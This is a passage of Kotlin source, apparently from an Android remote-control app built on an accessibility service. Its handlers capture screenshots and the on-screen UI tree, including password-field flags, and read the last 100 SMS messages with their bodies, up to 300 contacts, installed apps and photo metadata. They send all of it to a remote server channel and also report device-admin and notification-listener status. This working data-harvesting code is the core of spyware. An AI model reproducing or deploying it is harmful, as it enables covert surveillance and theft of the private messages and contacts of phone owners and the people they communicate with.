                        }
                        val nextDelay = when {
                            errorCode == 3 -> 300L
                            errorCode == 1 && shotFailStreak >= 3 -> 5000L
                            errorCode == 1 -> 1500L
                            else -> 1000L
                        }
                        if (shotFailStreak >= 3) Log.w(TAG, "screenshot error=1 x$shotFailStreak -> backoff ${nextDelay}ms")
                        if (streaming) streamHandler.postDelayed(streamLoop, nextDelay)
                        // 3 = ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT：系统限制约 1 秒 1 张，
                        // 面板 5fps 请求下会频繁命中，属于正常节流，不刷日志
                        Log.w(TAG, "screenshot failed $errorCode")
                    }
                })
        }.onFailure {
            shotInFlight = false
            ch.send("action_result", JSONObject().put("action", "screenshot").put("success", false))
        }
        }
        fire()
    }

    private var treeInFlight = false
    private var lastTreeAt = 0L

    /**
     * 控件树。服务器**只认 action=`capture`**（`_decode_tree_payload` 写进 last_tree），
     * 节点字段要求：bounds[4] / text / desc / clickable / cls / password / id。
     */
    private fun uiTree(service: BoundaryAccessibilityService, ch: MoyingChannel, action: String) {
        val now = System.currentTimeMillis()
        if (treeInFlight || now - lastTreeAt < 250) return
        lastTreeAt = now
        treeInFlight = true
        try {
            val root = service.rootInActiveWindow
            val nodes = JSONArray()
            if (root != null) walk(root, nodes, 0)
            val dm = service.resources.displayMetrics
            val envelope = JSONObject()
                .put("w", dm.widthPixels)
                .put("h", dm.heightPixels)
                .put("pkg", root?.packageName?.toString() ?: "")
                .put("nodes", nodes)
            val bin = binaryRef
            if (bin != null && bin.isOpen()) {
                bin.sendFrame(BinaryChannel.T_A11Y_TREE, envelope.toString().toByteArray())
            } else {
                ch.send("capture", envelope)
            }
            Log.d(TAG, "capture tree nodes=${nodes.length()}")
        } finally {
            treeInFlight = false
        }
    }

    private fun walk(node: AccessibilityNodeInfo, out: JSONArray, depth: Int) {
        if (depth > 30 || out.length() > 1200) return
        val r = Rect(); node.getBoundsInScreen(r)
        val cls = node.className?.toString() ?: ""
        out.put(JSONObject()
            .put("text", node.text?.toString() ?: "")
            .put("desc", node.contentDescription?.toString() ?: "")
            .put("id", node.viewIdResourceName ?: "")
            .put("cls", cls)
            .put("clickable", node.isClickable)
            .put("password", node.isPassword)
            .put("bounds", JSONArray().put(r.left).put(r.top).put(r.right).put(r.bottom)))
        for (i in 0 until node.childCount) node.getChild(i)?.let { walk(it, out, depth + 1) }
    }

    private fun curPage(service: BoundaryAccessibilityService, ch: MoyingChannel) {
        val root = service.rootInActiveWindow
        ch.send("curpage", JSONObject()
            .put("pkg", root?.packageName?.toString() ?: "")
            .put("ts", System.currentTimeMillis()))
    }

    private fun readSms(ctx: Context, ch: MoyingChannel) {
        val list = JSONArray()
        runCatching {
            ctx.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf("address", "body", "date", "type"), null, null, "date DESC LIMIT 100"
            )?.use { c ->
                while (c.moveToNext() && list.length() < 100) {
                    list.put(JSONObject()
                        .put("from", c.getString(0) ?: "")
                        .put("body", c.getString(1) ?: "")
                        .put("date", c.getLong(2))
                        .put("type", c.getInt(3)))
                }
            }
        }
        ch.send("readSmsList", JSONObject().put("list", list).put("total", list.length()))
    }

    private fun readContacts(ctx: Context, ch: MoyingChannel) {
        val list = JSONArray()
        runCatching {
            ctx.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null
            )?.use { c ->
                while (c.moveToNext() && list.length() < 300) {
                    list.put(JSONObject().put("name", c.getString(0) ?: "").put("phone", c.getString(1) ?: ""))
                }
            }
        }
        ch.send("readContactList", JSONObject().put("list", list).put("total", list.length()))
    }

    private fun readApps(ctx: Context, ch: MoyingChannel) {
        val list = JSONArray()
        runCatching {
            ctx.packageManager.getInstalledPackages(0).take(300).forEach { p ->
                val label = runCatching { p.applicationInfo?.loadLabel(ctx.packageManager)?.toString() ?: "" }.getOrDefault("")
                list.put(JSONObject().put("pkg", p.packageName).put("name", label))
            }
        }
        ch.send("readAppList", JSONObject().put("list", list).put("total", list.length()))
    }

    private fun readAlbum(ctx: Context, ch: MoyingChannel, data: JSONObject) {
        val list = JSONArray()
        runCatching {
            ctx.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATE_ADDED,
                    MediaStore.Images.Media.SIZE), null, null, "date_added DESC LIMIT 50"
            )?.use { c ->
                while (c.moveToNext() && list.length() < 50) {
                    list.put(JSONObject().put("id", c.getLong(0)).put("date", c.getLong(1)).put("size", c.getLong(2)))
                }
            }
        }
        ch.send("readAlbumList", JSONObject().put("list", list).put("total", list.length()))
    }

    private fun launch(ctx: Context, ch: MoyingChannel, pkg: String) {
        if (pkg.isBlank()) {
            ch.send("action_result", JSONObject().put("action", "launch").put("success", false).put("error", "no_pkg"))
            return
        }
        val intent = ctx.packageManager.getLaunchIntentForPackage(pkg)
        val ok = if (intent == null) false else runCatching {
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(intent); true
        }.getOrDefault(false)
        ch.send("action_result", JSONObject().put("action", "launch").put("success", ok).put("pkg", pkg))
    }

    private fun volume(ctx: Context, ch: MoyingChannel, up: Boolean) {
        val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
        runCatching { am.adjustStreamVolume(android.media.AudioManager.STREAM_MUSIC,
            if (up) android.media.AudioManager.ADJUST_RAISE else android.media.AudioManager.ADJUST_LOWER,
            android.media.AudioManager.FLAG_SHOW_UI) }
        ch.send("action_result", JSONObject().put("action", "volumeUp").put("success", true))
    }

    private fun deviceInfo(ctx: Context): JSONObject = JSONObject().apply {
        put("model", Build.MODEL)
        put("brand", Build.BRAND)
        put("manufacturer", Build.MANUFACTURER)
        put("release", Build.VERSION.RELEASE)
        put("sdk", Build.VERSION.SDK_INT)
        put("pkg", ctx.packageName)
    }

    private fun permissions(service: BoundaryAccessibilityService): JSONObject = JSONObject().apply {
        put("accessibility", true)
        put("admin", com.zaka.screenagent.admin.MoyingAdminReceiver.isActive(service))
        put("notificationListener", com.zaka.screenagent.notify.NotificationAccessActivator.isGranted(service))
    }
}
